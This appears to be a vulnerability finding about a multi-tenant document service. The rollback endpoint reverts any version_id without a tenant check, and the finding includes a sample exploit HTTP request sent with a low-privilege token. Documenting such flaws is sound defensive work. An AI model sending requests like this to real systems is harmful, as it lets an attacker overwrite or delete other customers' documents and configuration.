diagnosis: rollback_document_version accepts an arbitrary version_id and reverts the underlying model instance via version.revision.revert() without verifying that the target object belongs to the requesting user's tenant or workspace. An attacker can roll back, overwrite, or delete documents and system configuration instances belonging to any customer across the multi-tenant deployment.
exploit_request:
POST /api/documents/rollback/ HTTP/1.1
Host: docs.saasplatform.com
Authorization: Bearer <low_privilege_token>
Content-Type: application/json

{"version_id": 48910}
